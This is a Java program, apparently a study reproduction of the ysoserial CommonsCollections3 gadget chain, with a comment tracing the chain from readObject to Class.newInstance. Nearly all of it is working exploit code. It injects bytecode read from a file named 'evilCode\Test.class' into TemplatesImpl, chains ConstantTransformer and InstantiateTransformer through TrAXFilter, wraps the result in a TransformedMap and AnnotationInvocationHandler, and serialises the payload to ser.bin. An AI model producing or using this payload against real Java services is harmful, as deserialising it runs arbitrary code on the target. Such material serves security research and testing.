package org.CC.CC3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerHandlerImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

/**
 * Gadget chain:
 * 		ObjectInputStream.readObject()
 * 			AnnotationInvocationHandler.readObject()
 * 				Map(Proxy).entrySet()
 * 					AnnotationInvocationHandler.invoke()
 * 						MapEntry.setValue()
 * 					      TransformedMap.checkSetValue()
 * 							ChainedTransformer.transform()
 *  * 								ConstantTransformer.transform()
 *  * 								InstantiateTransformer.transform()
 *  * 							       TrAXFilter.init()
 *  * 									    TemplatesImpl.newTransformer()
 *  * 									    	TemplatesImpl.getTransletInstance()
 *  * 								                Class.newInstance()
 */

public class YsoCC3Test {
    public static void main(String[] args) throws TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {

        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");
        Field declaredField = tc.getDeclaredField("_bytecodes");
        declaredField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\evilCode\\Test.class"));
        byte[][] codes = {code};
        declaredField.set(templates,codes);


        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value",123);
        Map<Object,Object> decorate = TransformedMap.decorate(map, null, chainedTransformer);
        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(SuppressWarnings.class, decorate);
        serialize(o);
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
}
